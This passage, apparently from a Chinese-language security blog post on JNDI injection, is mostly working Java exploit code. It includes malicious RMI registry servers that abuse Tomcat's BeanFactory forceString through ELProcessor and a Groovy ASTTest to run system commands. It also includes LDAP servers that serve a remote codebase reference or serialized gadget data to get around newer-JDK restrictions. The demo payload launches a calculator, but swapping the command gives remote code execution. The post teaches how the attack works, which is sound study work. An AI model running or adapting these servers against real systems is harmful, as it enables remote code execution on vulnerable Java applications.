class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 循环解析别名并保存到字典中</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">上述代码中，可以通过在返回给客户端的Reference对象的forceString字段指定setter方法的别名，并在后续初始化过程中进行调用。</font></p><p><font style="color:#000000;">forceString的格式为a&#x3D;foo,bar，以逗号分隔每个需要设置的属性，如果包含等号，则对应的setter方法为等号后的值foo，如果不包含等号，则setter方法为默认值setBar。</font></p><p><font style="color:#000000;">在后续调用时，调用setter方法使用单个参数，且参数值为对应属性对象RefAddr的值。因此，实际上可以调用任意指定类的任意方法，并指定单个可控的参数。</font></p><p><font style="color:#000000;">因为使用newInstance创建实例，所以只能调用无参构造，这就要求目标class得有无参构造方法，上面forceString可以给属性强制指定一个setter方法，参数为一个String类型，因此利用javax.el.ELProcessor作为目标class，利用el表达式执行命令。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServerTomcatBypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;bypass&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h5><p><font style="color:#000000;">Groovy程序允许执行断言，也就意味着存在命令执行，借助BeanFactory的功能，使程序执行GroovyClassLoader#parseClass，然后去解析Groovy脚本即可。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServerGroovyBypass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;bypass&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="低版本JDK-1"><a href="#低版本JDK-1" class="headerlink" title="低版本JDK"></a>低版本JDK</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Server Code</span></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8888/#EXP&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client Code</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/EXP&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730881325456-f498d634-fa32-4840-a4a2-c051ce0e50cb.png"></p><h4 id="高版本JDK-1"><a href="#高版本JDK-1" class="headerlink" title="高版本JDK"></a>高版本JDK</h4><p><font style="color:#000000;">从JDK 6u211、7u201、11.0.1、8u191及更高版本开始，com.sun.jndi.ldap.object.trustURLCodebase的默认值为false，对LDAP Reference远程加载Factory类进行了限制，因此也需要找到绕过的方式。</font></p><p><font style="color:#000000;">在LDAP中，Java有多种方式进行数据存储。</font></p><ul><li><font style="color:#000000;">序列化数据</font></li><li><font style="color:#000000;">JNDI Reference</font></li><li><font style="color:#000000;">Marshalled Object</font></li><li><font style="color:#000000;">Remote Location</font></li></ul><p><font style="color:#000000;">除此以外，LDAP也可以为存储的对象指定多种属性。</font></p><ul><li><font style="color:#000000;">javaCodeBase</font></li><li><font style="color:#000000;">objectClass</font></li><li><font style="color:#000000;">javaFactory</font></li><li><font style="color:#000000;">javaSerializedData</font></li></ul><p><strong><font style="color:#000000;">LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。</font></strong><font style="color:#000000;">如果LDAP存储的某个对象的javaSerializedData值不为空，则客户端会通过调用obj.decodeObject()方法对该属性值内容进行反序列化，当客户端存在反序列化相关组件漏洞，则可以通过LDAP来传输恶意序列化对象。</font></p><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p><font style="color:#000000;">跟进com.sun.jndi.ldap.Obj.java#decodeObject方法，其主要功能是解码从LDAP Server来的对象，该对象可能是序列化的对象，也可能是一个Reference对象。decodeObject方法存在对JAVA_ATTRIBUTES[SERIALIZED_DATA]的判断，其中JAVA_ATTRIBUTES[1]为javaSerializedData。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730892021657-7a6f6724-fe2e-41e9-aa21-a20d951787d5.png"></p><p><font style="color:#000000;">跟进com.sun.jndi.ldap.Obj.java#deserializeObject方法，可以看到此处会进行readObject，因此可以通过修改ldap服务直接返回javaSerializedData参数的数据（序列化gadget数据），达到反序列化RCE。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730892256862-17813482-346f-452a-95d5-2752f2ab6439.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServerBypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argsx)</span> &#123;</span><br><span class="line">        String[] args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8000/#Evil&quot;</span>, <span class="string">&quot;1389&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">1</span> || args[<span class="number">0</span>].indexOf(<span class="string">&#x27;#&#x27;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[<span class="number">0</span>])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(<span 